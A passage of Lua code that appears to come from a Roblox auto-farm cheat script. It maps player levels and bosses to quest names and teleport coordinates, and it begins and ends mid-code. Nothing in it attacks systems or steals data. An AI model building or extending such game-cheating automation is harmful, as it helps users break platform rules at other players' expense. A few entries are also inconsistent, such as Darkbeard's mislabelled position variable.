                CFrameQ = CFrame.new(-450.104645, 107.681458, 5950.72607, 0.957107544, -0, -0.289732844, 0, 1, -0, 0.289732844, 0, 0.957107544)
                CFrameMon = CFrame.new(-245.9963836669922, 47.30615234375, 5584.1005859375)
            elseif Lv >= 1525 and Lv <= 1574 or SelectMonster == "Pistol Billionaire" then
                Ms = "Pistol Billionaire"
                QuestLv = 2
                NameQuest = "PiratePortQuest"
                NameMon = "Pistol Billionaire"
                CFrameQ = CFrame.new(-450.104645, 107.681458, 5950.72607, 0.957107544, -0, -0.289732844, 0, 1, -0, 0.289732844, 0, 0.957107544)
                CFrameMon = CFrame.new(-54.8110352, 83.7698746, 5947.84082, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
            elseif Lv >= 1575 and Lv <= 1599 or SelectMonster == "Dragon Crew Warrior" then
                Ms = "Dragon Crew Warrior"
                QuestLv = 1
                NameQuest = "DragonCrewQuest"
                NameMon = "Dragon Crew Warrior"
                CFrameQ = CFrame.new(6750.4931640625, 127.44916534423828, -711.0308837890625)
                CFrameMon = CFrame.new(6709.76367, 52.3442993, -1139.02966, -0.763515472, 0, 0.645789504, 0, 1, 0, -0.645789504, 0, -0.763515472)          
            elseif Lv >= 1600 and Lv <= 1624 or SelectMonster == "Dragon Crew Archer" then
                Ms = "Dragon Crew Archer"
                NameQuest = "DragonCrewQuest"
                QuestLv = 2
                NameMon = "Dragon Crew Archer"
                CFrameQ = CFrame.new(6750.4931640625, 127.44916534423828, -711.0308837890625)
                CFrameMon = CFrame.new(6668.76172, 481.376923, 329.12207, -0.121787429, 0, -0.992556155, 0, 1, 0, 0.992556155, 0, -0.121787429)
            elseif Lv >= 1625 and Lv <= 1649 or SelectMonster == "Hydra Enforcer" then
                Ms = "Hydra Enforcer"
                NameQuest = "VenomCrewQuest"
                QuestLv = 1
                NameMon = "Hydra Enforcer"
                CFrameQ = CFrame.new(5206.40185546875, 1004.10498046875, 748.3504638671875)
                CFrameMon = CFrame.new(4547.11523, 1003.10217, 334.194824, 0.388810456, -0, -0.921317935, 0, 1, -0, 0.921317935, 0, 0.388810456)
            elseif Lv >= 1650 and Lv <= 1699 or SelectMonster == "Venomous Assailant" then
                Ms = "Venomous Assailant"
                NameQuest = "VenomCrewQuest"
                QuestLv = 2
                NameMon = "Venomous Assailant"
                CFrameQ = CFrame.new(5206.40185546875, 1004.10498046875, 748.3504638671875)
                CFrameMon = CFrame.new(4674.92676, 1134.82654, 996.308838, 0.731321394, -0, -0.682033002, 0, 1, -0, 0.682033002, 0, 0.731321394)
            elseif Lv >= 1700 and Lv <= 1724 or SelectMonster == "Marine Commodore" then
                Ms = "Marine Commodore"
                QuestLv = 1
                NameQuest = "MarineTreeIsland"
                NameMon = "Marine Commodore"
                CFrameQ = CFrame.new(2481.09228515625, 74.27049255371094, -6779.640625)
                CFrameMon = CFrame.new(2577.25391, 75.6100006, -7739.87207, 0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, 0.499959469)
            elseif Lv >= 1725 and Lv <= 1774 or SelectMonster == "Marine Rear Admiral" then
                Ms = "Marine Rear Admiral"
                QuestLv = 2
                NameQuest = "MarineTreeIsland"
                NameMon = "Marine Rear Admiral"
                CFrameQ = CFrame.new(2481.09228515625, 74.27049255371094, -6779.640625)
                CFrameMon = CFrame.new(3761.81006, 123.912003, -6823.52197, 0.961273968, 0, 0.275594592, 0, 1, 0, -0.275594592, 0, 0.961273968)
            elseif Lv >= 1775 and Lv <= 1799 or SelectMonster == "Fishman Raider" then
                Ms = "Fishman Raider"
                QuestLv = 1
                NameQuest = "DeepForestIsland3"
                NameMon = "Fishman Raider"
                CFrameQ = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)   
                CFrameMon = CFrame.new(-10407.5263671875, 331.76263427734375, -8368.5166015625)
            elseif Lv >= 1800 and Lv <= 1824 or SelectMonster == "Fishman Captain" then
                Ms = "Fishman Captain"
                QuestLv = 2
                NameQuest = "DeepForestIsland3"
                NameMon = "Fishman Captain"
                CFrameQ = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)   
                CFrameMon = CFrame.new(-10994.701171875, 352.38140869140625, -9002.1103515625) 
            elseif Lv >= 1825 and Lv <= 1849 or SelectMonster == "Forest Pirate" then
                Ms = "Forest Pirate"
                QuestLv = 1
                NameQuest = "DeepForestIsland"
                NameMon = "Forest Pirate"
                CFrameQ = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                CFrameMon = CFrame.new(-13274.478515625, 332.3781433105469, -7769.58056640625)
            elseif Lv >= 1850 and Lv <= 1899 or SelectMonster == "Mythological Pirate" then
                Ms = "Mythological Pirate"
                QuestLv = 2
                NameQuest = "DeepForestIsland"
                NameMon = "Mythological Pirate"
                CFrameQ = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)   
                CFrameMon = CFrame.new(-13680.607421875, 501.08154296875, -6991.189453125)
            elseif Lv >= 1900 and Lv <= 1924 or SelectMonster == "Jungle Pirate" then
                Ms = "Jungle Pirate"
                QuestLv = 1
                NameQuest = "DeepForestIsland2"
                NameMon = "Jungle Pirate"
                CFrameQ = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                CFrameMon = CFrame.new(-12256.16015625, 331.73828125, -10485.8369140625)
            elseif Lv >= 1925 and Lv <= 1974 or SelectMonster == "Musketeer Pirate" then
                Ms = "Musketeer Pirate"
                QuestLv = 2
                NameQuest = "DeepForestIsland2"
                NameMon = "Musketeer Pirate"
                CFrameQ = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                CFrameMon = CFrame.new(-13457.904296875, 391.545654296875, -9859.177734375)
            elseif Lv >= 1975 and Lv <= 1999 or SelectMonster == "Reborn Skeleton" then
                Ms = "Reborn Skeleton"
                QuestLv = 1
                NameQuest = "HauntedQuest1"
                NameMon = "Reborn Skeleton"
                CFrameQ = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-8763.7236328125, 165.72299194335938, 6159.86181640625)
            elseif Lv >= 2000 and Lv <= 2024 or SelectMonster == "Living Zombie" then
                Ms = "Living Zombie"
                QuestLv = 2
                NameQuest = "HauntedQuest1"
                NameMon = "Living Zombie"
                CFrameQ = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                CFrameMon = CFrame.new(-10144.1318359375, 138.62667846679688, 5838.0888671875)
            elseif Lv >= 2025 and Lv <= 2049 or SelectMonster == "Demonic Soul" then
                Ms = "Demonic Soul"
                QuestLv = 1
                NameQuest = "HauntedQuest2"
                NameMon = "Demonic Soul"
                CFrameQ = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0) 
                CFrameMon = CFrame.new(-9505.8720703125, 172.10482788085938, 6158.9931640625)
            elseif Lv >= 2050 and Lv <= 2074 or SelectMonster == "Posessed Mummy" then
                Ms = "Posessed Mummy"
                QuestLv = 2
                NameQuest = "HauntedQuest2"
                NameMon = "Posessed Mummy"
                CFrameQ = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-9582.0224609375, 6.251527309417725, 6205.478515625)
            elseif Lv >= 2075 and Lv <= 2099 or SelectMonster == "Peanut Scout" then
                Ms = "Peanut Scout"
                QuestLv = 1
                NameQuest = "NutsIslandQuest"
                NameMon = "Peanut Scout"
                CFrameQ = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-2143.241943359375, 47.72198486328125, -10029.9951171875)
            elseif Lv >= 2100 and Lv <= 2124 or SelectMonster == "Peanut President" then
                Ms = "Peanut President"
                QuestLv = 2
                NameQuest = "NutsIslandQuest"
                NameMon = "Peanut President"
                CFrameQ = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-1859.35400390625, 38.10316848754883, -10422.4296875)
            elseif Lv >= 2125 and Lv <= 2149 or SelectMonster == "Ice Cream Chef" then
                Ms = "Ice Cream Chef"
                QuestLv = 1
                NameQuest = "IceCreamIslandQuest"
                NameMon = "Ice Cream Chef"
                CFrameQ = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-872.24658203125, 65.81957244873047, -10919.95703125)
            elseif Lv >= 2150 and Lv <= 2199 or SelectMonster == "Ice Cream Commander" then
                Ms = "Ice Cream Commander"
                QuestLv = 2
                NameQuest = "IceCreamIslandQuest"
                NameMon = "Ice Cream Commander"
                CFrameQ = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                CFrameMon = CFrame.new(-558.06103515625, 112.04895782470703, -11290.7744140625)
            elseif Lv >= 2200 and Lv <= 2224 or SelectMonster == "Cookie Crafter" then
                Ms = "Cookie Crafter"
                QuestLv = 1
                NameQuest = "CakeQuest1"
                NameMon = "Cookie Crafter"
                CFrameQ = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                CFrameMon = CFrame.new(-2374.13671875, 37.79826354980469, -12125.30859375)
            elseif Lv >= 2225 and Lv <= 2249 or SelectMonster == "Cake Guard" then
                Ms = "Cake Guard"
                QuestLv = 2
                NameQuest = "CakeQuest1"
                NameMon = "Cake Guard"
                CFrameQ = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                CFrameMon = CFrame.new(-1598.3070068359375, 43.773197174072266, -12244.5810546875)
            elseif Lv >= 2250 and Lv <= 2274 or SelectMonster == "Baking Staff" then
                Ms = "Baking Staff"
                QuestLv = 1
                NameQuest = "CakeQuest2"
                NameMon = "Baking Staff"
                CFrameQ = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                CFrameMon = CFrame.new(-1887.8099365234375, 77.6185073852539, -12998.3505859375)
            elseif Lv >= 2275 and Lv <= 2299 or SelectMonster == "Head Baker" then
                Ms = "Head Baker"
                QuestLv = 2
                NameQuest = "CakeQuest2"
                NameMon = "Head Baker"
                CFrameQ = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                CFrameMon = CFrame.new(-2216.188232421875, 82.884521484375, -12869.2939453125)
            elseif Lv >= 2300 and Lv <= 2324 or SelectMonster == "Cocoa Warrior" then
                Ms = "Cocoa Warrior"
                QuestLv = 1
                NameQuest = "ChocQuest1"
                NameMon = "Cocoa Warrior"
                CFrameQ = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375)
                CFrameMon = CFrame.new(-21.55328369140625, 80.57499694824219, -12352.3876953125)
            elseif Lv >= 2325 and Lv <= 2349 or SelectMonster == "Chocolate Bar Battler" then
                Ms = "Chocolate Bar Battler"
                QuestLv = 2
                NameQuest = "ChocQuest1"
                NameMon = "Chocolate Bar Battler"
                CFrameQ = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375)
                CFrameMon = CFrame.new(582.590576171875, 77.18809509277344, -12463.162109375)
            elseif Lv >= 2350 and Lv <= 2374 or SelectMonster == "Sweet Thief" then
                Ms = "Sweet Thief"
                QuestLv = 1
                NameQuest = "ChocQuest2"
                NameMon = "Sweet Thief"
                CFrameQ = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875)
                CFrameMon = CFrame.new(165.1884765625, 76.05885314941406, -12600.8369140625)
            elseif Lv >= 2375 and Lv <= 2399 or SelectMonster == "Candy Rebel" then
                Ms = "Candy Rebel"
                QuestLv = 2
                NameQuest = "ChocQuest2"
                NameMon = "Candy Rebel"
                CFrameQ = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875)
                CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, -12876.5478515625)
            elseif Lv >= 2400 and Lv <= 2424 or SelectMonster == "Candy Pirate" then
                Ms = "Candy Pirate"
                QuestLv = 1
                NameQuest = "CandyQuest1"
                NameMon = "Candy Pirate"
                CFrameQ = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
                CFrameMon = CFrame.new(-1310.5003662109375, 26.016523361206055, -14562.404296875)
            elseif Lv >= 2425 and Lv <= 2449 or SelectMonster == "Snow Demon" then
                Ms = "Snow Demon"
                QuestLv = 2
                NameQuest = "CandyQuest1"
                NameMon = "Snow Demon"
                CFrameQ = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375)
                CFrameMon = CFrame.new(-880.2006225585938, 71.24776458740234, -14538.609375)
            elseif Lv >= 2450 and Lv <= 2474 or SelectMonster == "Isle Outlaw" then
                Ms = "Isle Outlaw"
                QuestLv = 1
                NameQuest = "TikiQuest1"
                NameMon = "Isle Outlaw"
                CFrameQ = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812)
                CFrameMon = CFrame.new(-16442.814453125, 116.13899993896484, -264.4637756347656)
            elseif Lv >= 2475 and Lv <= 2524 or SelectMonster == "Island Boy" then
                Ms = "Island Boy"
                QuestLv = 2
                NameQuest = "TikiQuest1"
                NameMon = "Island Boy"
                CFrameQ = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812)
                CFrameMon = CFrame.new(-16901.26171875, 84.06756591796875, -192.88906860351562)
            elseif Lv >= 2525 and Lv <= 2550 or SelectMonster == "Isle Champion" then
                Ms = "Isle Champion"
                QuestLv = 2
                NameQuest = "TikiQuest2"
                NameMon = "Isle Champion"
                CFrameQ = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625)
                CFrameMon = CFrame.new(-16641.6796875, 235.7825469970703, 1031.282958984375)
                elseif Lv >= 2550 and Lv <= 2574 or SelectMonster == "Serpent Hunter" then
                Ms = "Serpent Hunter"
                QuestLv = 1
                NameQuest = "TikiQuest3"
                NameMon = "Serpent Hunter"
                CFrameQ = CFrame.new(-16665.1914, 104.596405, 1579.69434, 0.951068401, -0, -0.308980465, 0, 1, -0, 0.308980465, 0, 0.951068401)
                CFrameMon = CFrame.new(-16521.0625, 106.09285, 1488.78467, 0.469467044, 0, 0.882950008, 0, 1, 0, -0.882950008, 0, 0.469467044)
               elseif Lv >= 2575 and Lv <= 2650 or SelectMonster == "Skull Slayer" then
                Ms = "Skull Slayer"
                QuestLv = 2
                NameQuest = "TikiQuest3"
                NameMon = "Skull Slayer"
                CFrameQ = CFrame.new(-16665.1914, 104.596405, 1579.69434, 0.951068401, -0, -0.308980465, 0, 1, -0, 0.308980465, 0, 0.951068401)
                CFrameMon = CFrame.new(-16855.043, 122.457253, 1478.15308, -0.999392271, 0, -0.0348687991, 0, 1, 0, 0.0348687991, 0, -0.999392271)
            end
        end
    end
--[[
if Sea1 then
tableMon = {
  "Bandit","Monkey","Gorilla","Pirate","Brute","Desert Bandit","Desert Officer","Snow Bandit","Snowman","Chief Petty Officer","Sky Bandit","Dark Master","Prisoner", "Dangerous Prisoner","Toga Warrior","Gladiator","Military Soldier","Military Spy","Fishman Warrior","Fishman Commando","God's Guard","Shanda","Royal Squad","Royal Soldier","Galley Pirate","Galley Captain"
} elseif Sea2 then
tableMon = {
  "Raider","Mercenary","Swan Pirate","Factory Staff","Marine Lieutenant","Marine Captain","Zombie","Vampire","Snow Trooper","Winter Warrior","Lab Subordinate","Horned Warrior","Magma Ninja","Lava Pirate","Ship Deckhand","Ship Engineer","Ship Steward","Ship Officer","Arctic Warrior","Snow Lurker","Sea Soldier","Water Fighter"
} elseif Sea3 then
tableMon = {
  "Pirate Millionaire","Dragon Crew Warrior","Dragon Crew Archer","Hydra Enforcer","Venomous Assailant","Marine Commodore","Marine Rear Admiral","Fishman Raider","Fishman Captain","Forest Pirate","Mythological Pirate","Jungle Pirate","Musketeer Pirate","Reborn Skeleton","Living Zombie","Demonic Soul","Posessed Mummy", "Peanut Scout", "Peanut President", "Ice Cream Chef", "Ice Cream Commander", "Cookie Crafter", "Cake Guard", "Baking Staff", "Head Baker", "Cocoa Warrior", "Chocolate Bar Battler", "Sweet Thief", "Candy Rebel", "Candy Pirate", "Snow Demon","Isle Outlaw","Island Boy","Sun-kissed Warrior","Isle Champion","Serpent Hunter","Skull Slayer"
}
end
if Sea1 then
AreaList = {
  'Jungle', 'Buggy', 'Desert', 'Snow', 'Marine', 'Sky', 'Prison', 'Colosseum', 'Magma', 'Fishman', 'Sky Island', 'Fountain'
} elseif Sea2 then
AreaList = {
  'Area 1', 'Area 2', 'Zombie', 'Marine', 'Snow Mountain', 'Ice fire', 'Ship', 'Frost', 'Forgotten'
} elseif Sea3 then
AreaList = {
  'Pirate Port', 'Amazon', 'Marine Tree', 'Deep Forest', 'Haunted Castle', 'Nut Island', 'Ice Cream Island', 'Cake Island', 'Choco Island', 'Candy Island','Tiki Outpost'
}
end
function CheckBossQuest()
if Sea1 then
if SelectBoss == "The Gorilla King" then
BossMon = "The Gorilla King"
NameBoss = 'The Gorrila King'
NameQuestBoss = "JungleQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$2,000\n7,000 Exp."
CFrameQBoss = CFrame.new(-1601.6553955078, 36.85213470459, 153.38809204102)
CFrameBoss = CFrame.new(-1088.75977, 8.13463783,-488.559906,-0.707134247, 0, 0.707079291, 0, 1, 0,-0.707079291, 0,-0.707134247)
elseif SelectBoss == "Bobby" then
BossMon = "Bobby"
NameBoss = 'Bobby'
NameQuestBoss = "BuggyQuest1"
QuestLvBoss = 3
RewardBoss = "Reward:\n$8,000\n35,000 Exp."
CFrameQBoss = CFrame.new(-1140.1761474609, 4.752049446106, 3827.4057617188)
CFrameBoss = CFrame.new(-1087.3760986328, 46.949409484863, 4040.1462402344)
elseif SelectBoss == "The Saw" then
BossMon = "The Saw"
NameBoss = 'The Saw'
CFrameBoss = CFrame.new(-784.89715576172, 72.427383422852, 1603.5822753906)
elseif SelectBoss == "Yeti" then
BossMon = "Yeti"
NameBoss = 'Yeti'
NameQuestBoss = "SnowQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$10,000\n180,000 Exp."
CFrameQBoss = CFrame.new(1386.8073730469, 87.272789001465,-1298.3576660156)
CFrameBoss = CFrame.new(1218.7956542969, 138.01184082031,-1488.0262451172)
elseif SelectBoss == "Mob Leader" then
BossMon = "Mob Leader"
NameBoss = 'Mob Leader'
CFrameBoss = CFrame.new(-2844.7307128906, 7.4180502891541, 5356.6723632813)
elseif SelectBoss == "Vice Admiral" then
BossMon = "Vice Admiral"
NameBoss = 'Vice Admiral'
NameQuestBoss = "MarineQuest2"
QuestLvBoss = 2
RewardBoss = "Reward:\n$10,000\n180,000 Exp."
CFrameQBoss = CFrame.new(-5036.2465820313, 28.677835464478, 4324.56640625)
CFrameBoss = CFrame.new(-5006.5454101563, 88.032081604004, 4353.162109375)
elseif SelectBoss == "Saber Expert" then
NameBoss = 'Saber Expert'
BossMon = "Saber Expert"
CFrameBoss = CFrame.new(-1458.89502, 29.8870335,-50.633564)
elseif SelectBoss == "Warden" then
BossMon = "Warden"
NameBoss = 'Warden'
NameQuestBoss = "ImpelQuest"
QuestLvBoss = 1
RewardBoss = "Reward:\n$6,000\n850,000 Exp."
CFrameBoss = CFrame.new(5278.04932, 2.15167475, 944.101929, 0.220546961,-4.49946401e-06, 0.975376427,-1.95412576e-05, 1, 9.03162072e-06,-0.975376427,-2.10519756e-05, 0.220546961)
CFrameQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721,-0.731384635, 0, 0.681965172, 0, 1, 0,-0.681965172, 0,-0.731384635)
elseif SelectBoss == "Chief Warden" then
BossMon = "Chief Warden"
NameBoss = 'Chief Warden'
NameQuestBoss = "ImpelQuest"
QuestLvBoss = 2
RewardBoss = "Reward:\n$10,000\n1,000,000 Exp."
CFrameBoss = CFrame.new(5206.92578, 0.997753382, 814.976746, 0.342041343,-0.00062915677, 0.939684749, 0.00191645394, 0.999998152,-2.80422337e-05,-0.939682961, 0.00181045406, 0.342041939)
CFrameQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721,-0.731384635, 0, 0.681965172, 0, 1, 0,-0.681965172, 0,-0.731384635)
elseif SelectBoss == "Swan" then
BossMon = "Swan"
NameBoss = 'Swan'
NameQuestBoss = "ImpelQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$15,000\n1,600,000 Exp."
CFrameBoss = CFrame.new(5325.09619, 7.03906584, 719.570679,-0.309060812, 0, 0.951042235, 0, 1, 0,-0.951042235, 0,-0.309060812)
CFrameQBoss = CFrame.new(5191.86133, 2.84020686, 686.438721,-0.731384635, 0, 0.681965172, 0, 1, 0,-0.681965172, 0,-0.731384635)
elseif SelectBoss == "Magma Admiral" then
BossMon = "Magma Admiral"
NameBoss = 'Magma Admiral'
NameQuestBoss = "MagmaQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$15,000\n2,800,000 Exp."
CFrameQBoss = CFrame.new(-5314.6220703125, 12.262420654297, 8517.279296875)
CFrameBoss = CFrame.new(-5765.8969726563, 82.92064666748, 8718.3046875)
elseif SelectBoss == "Fishman Lord" then
BossMon = "Fishman Lord"
NameBoss = 'Fishman Lord'
NameQuestBoss = "FishmanQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$15,000\n4,000,000 Exp."
CFrameQBoss = CFrame.new(61122.65234375, 18.497442245483, 1569.3997802734)
CFrameBoss = CFrame.new(61260.15234375, 30.950881958008, 1193.4329833984)
elseif SelectBoss == "Wysper" then
BossMon = "Wysper"
NameBoss = 'Wysper'
NameQuestBoss = "SkyExp1Quest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$15,000\n4,800,000 Exp."
CFrameQBoss = CFrame.new(-7861.947265625, 5545.517578125,-379.85974121094)
CFrameBoss = CFrame.new(-7866.1333007813, 5576.4311523438,-546.74816894531)
elseif SelectBoss == "Thunder God" then
BossMon = "Thunder God"
NameBoss = 'Thunder God'
NameQuestBoss = "SkyExp2Quest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$20,000\n5,800,000 Exp."
CFrameQBoss = CFrame.new(-7903.3828125, 5635.9897460938,-1410.923828125)
CFrameBoss = CFrame.new(-7994.984375, 5761.025390625,-2088.6479492188)
elseif SelectBoss == "Cyborg" then
BossMon = "Cyborg"
NameBoss = 'Cyborg'
NameQuestBoss = "FountainQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$20,000\n7,500,000 Exp."
CFrameQBoss = CFrame.new(5258.2788085938, 38.526931762695, 4050.044921875)
CFrameBoss = CFrame.new(6094.0249023438, 73.770050048828, 3825.7348632813)
elseif SelectBoss == "Ice Admiral" then
BossMon = "Ice Admiral"
NameBoss = 'Ice Admiral'
CFrameBoss = CFrame.new(1266.08948, 26.1757946,-1399.57678,-0.573599219, 0,-0.81913656, 0, 1, 0, 0.81913656, 0,-0.573599219)
elseif SelectBoss == "Greybeard" then
BossMon = "Greybeard"
NameBoss = 'Greybeard'
CFrameBoss = CFrame.new(-5081.3452148438, 85.221641540527, 4257.3588867188)
end
end
if Sea2 then
if SelectBoss == "Diamond" then
BossMon = "Diamond"
NameBoss = 'Diamond'
NameQuestBoss = "Area1Quest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$25,000\n9,000,000 Exp."
CFrameQBoss = CFrame.new(-427.5666809082, 73.313781738281, 1835.4208984375)
CFrameBoss = CFrame.new(-1576.7166748047, 198.59265136719, 13.724286079407)
elseif SelectBoss == "Jeremy" then
BossMon = "Jeremy"
NameBoss = 'Jeremy'
NameQuestBoss = "Area2Quest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$25,000\n11,500,000 Exp."
CFrameQBoss = CFrame.new(636.79943847656, 73.413787841797, 918.00415039063)
CFrameBoss = CFrame.new(2006.9261474609, 448.95666503906, 853.98284912109)
elseif SelectBoss == "Fajita" then
BossMon = "Fajita"
NameBoss = 'Fajita'
NameQuestBoss = "MarineQuest3"
QuestLvBoss = 3
RewardBoss = "Reward:\n$25,000\n15,000,000 Exp."
CFrameQBoss = CFrame.new(-2441.986328125, 73.359344482422,-3217.5324707031)
CFrameBoss = CFrame.new(-2172.7399902344, 103.32216644287,-4015.025390625)
elseif SelectBoss == "Don Swan" then
BossMon = "Don Swan"
NameBoss = 'Don Swan'
CFrameBoss = CFrame.new(2286.2004394531, 15.177839279175, 863.8388671875)
elseif SelectBoss == "Smoke Admiral" then
BossMon = "Smoke Admiral"
NameBoss = 'Smoke Admiral'
NameQuestBoss = "IceSideQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$20,000\n25,000,000 Exp."
CFrameQBoss = CFrame.new(-5429.0473632813, 15.977565765381,-5297.9614257813)
CFrameBoss = CFrame.new(-5275.1987304688, 20.757257461548,-5260.6669921875)
elseif SelectBoss == "Awakened Ice Admiral" then
BossMon = "Awakened Ice Admiral"
NameBoss = 'Awakened Ice Admiral'
NameQuestBoss = "FrostQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$20,000\n36,000,000 Exp."
CFrameQBoss = CFrame.new(5668.9780273438, 28.519989013672,-6483.3520507813)
CFrameBoss = CFrame.new(6403.5439453125, 340.29766845703,-6894.5595703125)
elseif SelectBoss == "Tide Keeper" then
BossMon = "Tide Keeper"
NameBoss = 'Tide Keeper'
NameQuestBoss = "ForgottenQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$12,500\n38,000,000 Exp."
CFrameQBoss = CFrame.new(-3053.9814453125, 237.18954467773,-10145.0390625)
CFrameBoss = CFrame.new(-3795.6423339844, 105.88877105713,-11421.307617188)
elseif SelectBoss == "Darkbeard" then
BossMon = "Darkbeard"
NameBoss = 'Darkbeard'
CFrameMon = CFrame.new(3677.08203125, 62.751937866211,-3144.8332519531)
elseif SelectBoss == "Cursed Captain" then
BossMon = "Cursed Captain"
NameBoss = 'Cursed Captain'
CFrameBoss = CFrame.new(916.928589, 181.092773, 33422)
elseif SelectBoss == "Order" then
BossMon = "Order"
NameBoss = 'Order'
CFrameBoss = CFrame.new(-6217.2021484375, 28.047645568848,-5053.1357421875)
end
end
if Sea3 then
if SelectBoss == "Stone" then
BossMon = "Stone"
NameBoss = 'Stone'
NameQuestBoss = "PiratePortQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$25,000\n40,000,000 Exp."
CFrameQBoss = CFrame.new(-289.76705932617, 43.819011688232, 5579.9384765625)
CFrameBoss = CFrame.new(-1027.6512451172, 92.404174804688, 6578.8530273438)
elseif SelectBoss == "Hydra Leader" then
BossMon = "Hydra Leader"
NameBoss = 'Hydra Leader'
NameQuestBoss = "VenomCrewQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$30,000\n52,000,000 Exp."
CFrameQBoss = CFrame.new(5445.9541015625, 601.62945556641, 751.43792724609)
CFrameBoss = CFrame.new(5543.86328125, 668.97399902344, 199.0341796875)
elseif SelectBoss == "Kilo Admiral" then
BossMon = "Kilo Admiral"
NameBoss = 'Kilo Admiral'
NameQuestBoss = "MarineTreeIsland"
QuestLvBoss = 3
RewardBoss = "Reward:\n$35,000\n56,000,000 Exp."
CFrameQBoss = CFrame.new(2179.3010253906, 28.731239318848,-6739.9741210938)
CFrameBoss = CFrame.new(2764.2233886719, 432.46154785156,-7144.4580078125)
elseif SelectBoss == "Captain Elephant" then
BossMon = "Captain Elephant"
NameBoss = 'Captain Elephant'
NameQuestBoss = "DeepForestIsland"
QuestLvBoss = 3
RewardBoss = "Reward:\n$40,000\n67,000,000 Exp."
CFrameQBoss = CFrame.new(-13232.682617188, 332.40396118164,-7626.01171875)
CFrameBoss = CFrame.new(-13376.7578125, 433.28689575195,-8071.392578125)
elseif SelectBoss == "Beautiful Pirate" then
BossMon = "Beautiful Pirate"
NameBoss = 'Beautiful Pirate'
NameQuestBoss = "DeepForestIsland2"
QuestLvBoss = 3
RewardBoss = "Reward:\n$50,000\n70,000,000 Exp."
CFrameQBoss = CFrame.new(-12682.096679688, 390.88653564453,-9902.1240234375)
CFrameBoss = CFrame.new(5283.609375, 22.56223487854,-110.78285217285)
elseif SelectBoss == "Cake Queen" then
BossMon = "Cake Queen"
NameBoss = 'Cake Queen'
NameQuestBoss = "IceCreamIslandQuest"
QuestLvBoss = 3
RewardBoss = "Reward:\n$30,000\n112,500,000 Exp."
CFrameQBoss = CFrame.new(-819.376709, 64.9259796,-10967.2832,-0.766061664, 0, 0.642767608, 0, 1, 0,-0.642767608, 0,-0.766061664)
CFrameBoss = CFrame.new(-678.648804, 381.353943,-11114.2012,-0.908641815, 0.00149294338, 0.41757378, 0.00837114919, 0.999857843, 0.0146408929,-0.417492568, 0.0167988986,-0.90852499)
elseif SelectBoss == "Longma" then
BossMon = "Longma"
